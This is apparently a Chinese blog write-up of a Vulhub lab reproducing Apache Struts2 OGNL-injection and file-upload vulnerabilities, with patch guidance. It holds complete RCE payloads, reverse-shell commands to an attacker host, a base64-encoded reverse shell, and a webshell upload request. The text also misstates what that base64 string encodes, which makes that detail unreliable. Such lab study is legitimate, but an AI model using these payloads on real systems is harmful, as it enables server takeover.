---
title: Apache Struts2
published: 2026-09-10T09:00:00+08:00
description: 全面解析 Struts2 框架的 OGNL 表达式注入漏洞，从 S2-001 到 S2-067 完整复现，涵盖 S2-045（CVE-2017-5638）、S2-057（CVE-2018-11776）、S2-061（CVE-2020-17530）、S2-067（CVE-2024-53677）等核心漏洞的原理分析、利用手法及实战修复方案。
image: images/Pasted image 20260909132644.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: true
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                                                                                    |
| ----------- | --------------------------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.10）                                                                                         |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                                                |
| **CVSS 评分** | S2-045: 9.8（严重） / S2-057: 9.8（严重） / S2-061: 9.8（严重）                                                                   |
| **典型漏洞编号**  | S2-045（CVE-2017-5638）/ S2-057（CVE-2018-11776）/ S2-061（CVE-2020-17530）/ S2-066（CVE-2023-50164）/ S2-067（CVE-2024-53677） |
| **影响组件**    | Apache Struts2 2.0.0 ~ 6.3.0（各漏洞影响版本不同）                                                                               |
| **漏洞类型**    | OGNL 表达式注入 → 远程代码执行（RCE）/ 路径遍历                                                                                        |
| **利用条件**    | 使用漏洞版 Struts2 + 用户可控的 OGNL 表达式输入点                                                                                     |
| **核心原理**    | `%{...}` 或 `${...}` 表达式未安全过滤，导致 OGNL 解析器执行恶意代码                                                                        |

Struts2 漏洞的核心几乎都围绕着一个技术点——**OGNL（Object-Graph Navigation Language，对象图导航语言）表达式注入**。理解 OGNL 注入的原理，就等于拿到了理解整个 Struts2 漏洞家族的钥匙。

### 一、环境搭建

Vulhub 是一个基于 Docker 的漏洞环境集合，能够实现“开箱即用”。

```bash
# 1. 克隆 Vulhub 仓库
git clone https://github.com/vulhub/vulhub.git

# 2. 进入 Struts2 漏洞目录（以 S2-045 为例）
cd vulhub/struts2/s2-045

# 3. 启动漏洞环境
docker-compose up -d
```

启动后，访问 `http://127.0.0.1:8080` 即可看到 Struts2 的演示页面。其他漏洞对应的目录如下：

| 漏洞编号 | Vulhub 目录 | 说明 |
|---------|------------|------|
| S2-001 | `struts2/s2-001` | 最早期漏洞，参数值二次解析 |
| S2-016 | `struts2/s2-016` | Payload 极简，适合入门理解 OGNL |
| S2-045 | `struts2/s2-045` | CVE-2017-5638，影响 Struts 2.3.5–2.3.31 和 2.5–2.5.10 |
| S2-053 | `struts2/s2-053` | CVE-2017-12611，Freemarker 模板注入 |
| S2-057 | `struts2/s2-057` | CVE-2018-11776，namespace 配置不当导致 RCE |
| S2-059 | `struts2/s2-059` | CVE-2019-0230，标签属性二次解析 |
| S2-061 | `struts2/s2-061` | CVE-2020-17530，S2-059 沙盒绕过 |
| S2-066 | `struts2/s2-066` | CVE-2023-50164，文件上传目录穿越 |
| S2-067 | `struts2/s2-067` | CVE-2024-53677，最新文件上传逻辑漏洞 |

1. **先打 S2-016**：用最简单的方式理解 OGNL 注入流程，不要管沙盒。
2. **再打 S2-045**：掌握 Content-Type 注入的经典姿势。
3. **然后 S2-057**：理解 namespace 注入的不同思路。
4. **接着 S2-061**：看沙盒是如何被绕过的。
5. **最后 S2-067**：换个口味，体验文件上传漏洞。

### 二、漏洞复现

#### 方式一：S2-045（Content-Type 注入）

S2-045 的漏洞点在于 **Content-Type 请求头**。Struts2 在处理 multipart 请求时，会对 Content-Type 进行 OGNL 解析，且未做充分过滤。

**① 验证漏洞是否存在**

抓包，将正常请求的 Content-Type 替换为以下 Payload（执行数学计算验证）：

```
Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='233*233').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

如果返回 `54289`（233×233 的结果），说明漏洞存在。

**② 执行任意命令**

将 Payload 中的 `#cmd='233*233'` 替换为 `#cmd='id'` 即可执行系统命令并回显。

**③ 反弹 Shell**

将命令替换为反弹 Shell 指令即可。例如在 Linux 环境下：
```
#cmd='bash -i >& /dev/tcp/攻击机IP/4444 0>&1'
```

---

#### 方式二：S2-016（URL 参数注入）

S2-016 的 Payload 相对简洁，适合初学者理解 OGNL 注入原理。

**① 原始 Payload（未编码）**

```
/index.action?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("id"),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#d),#matt.getWriter().flush(),#matt.getWriter().close()}
```

**② URL 编码后的 Payload**

```
/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D@java.lang.Runtime@getRuntime().exec(%22id%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D
```

> **关键细节**：`#` 符号在 URL 中被浏览器识别为锚点（fragment），`#` 后面的内容会被浏览器截断，不会发送给服务端。因此**必须对 `#` 进行 URL 编码（`%23`）**，否则 Payload 无法生效。

---

#### 方式三：S2-061（标签属性注入）

S2-061 的触发点在于 **Struts2 标签的属性值会被二次解析**。当标签属性（如 `id`）使用了 `%{x}` 且 `x` 的值用户可控时，可注入 OGNL 表达式。

**反弹 Shell Payload（HTTP POST）**：

```http
POST /index.action HTTP/1.1
Host: 靶机IP:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 922

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

其中 `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjIyMiAgIDA+JjE=` 是 `bash -i >& /dev/tcp/攻击机IP/4444 0>&1` 的 Base64 编码。

---

#### 方式四：S2-067（文件上传路径穿越）

S2-067（CVE-2024-53677）是较新的漏洞，利用了 Struts2 文件上传功能中 `FileUploadInterceptor` 的路径遍历缺陷。

**漏洞利用**：构造恶意文件上传请求，通过路径穿越将 Webshell 上传到 Web 根目录。

```http
POST /uploads.action HTTP/1.1
Host: 靶机IP:8080
Content-Type: multipart/form-data; boundary=---------------------------3760584483

-----------------------------3760584483
Content-Disposition: form-data; name="Upload"; filename="../../../../shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.io.*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-----------------------------3760584483--
```

通过 `../../../../` 路径穿越，将 `shell.jsp` 写入 Web 根目录，随后访问即可执行任意命令。

---

### 三、漏洞原理总结

| 漏洞编号 | CVE | 注入点 | 利用方式 |
|---------|-----|--------|---------|
| **S2-016** | — | URL 参数 | `redirect:` 参数注入 OGNL |
| **S2-045** | CVE-2017-5638 | Content-Type 头 | 请求头注入 OGNL |
| **S2-053** | CVE-2017-12611 | Content-Disposition | 文件上传头注入 OGNL |
| **S2-057** | CVE-2018-11776 | namespace | XML 配置 namespace 注入 |
| **S2-061** | CVE-2020-17530 | 标签属性 | 标签属性二次解析 |
| **S2-066** | CVE-2023-50164 | 文件上传参数 | 目录穿越 + 文件上传 |
| **S2-067** | CVE-2024-53677 | 文件上传逻辑 | 路径遍历上传 Webshell |

**核心本质**：所有漏洞的根源都是 **OGNL 表达式注入**——用户输入被未经处理地拼接进 OGNL 表达式并执行。

---

### 四、修复方案

| 漏洞 | 修复版本 | 临时措施 |
|------|---------|---------|
| S2-045 | Struts 2.3.32 / 2.5.10.1 | 升级框架版本 |
| S2-057 | Struts 2.3.35 / 2.5.17 | 升级框架版本 |
| S2-061 | Struts 2.5.26 | 升级框架版本 |
| S2-066 | Struts 2.5.33 / 6.3.0.2 | 升级框架版本 |
| S2-067 | Struts 6.3.0.2+ | 升级框架版本 |

**通用建议**：
1. 升级到 Struts2 最新安全版本
2. 如无法升级，考虑部署 WAF 拦截恶意 OGNL 表达式特征
3. 严格过滤用户输入中的 `${`、`%{`、`#` 等特殊字符

---

> **免责声明**：本文内容仅供网络安全技术研究与学习使用，禁止用于任何非法攻击行为。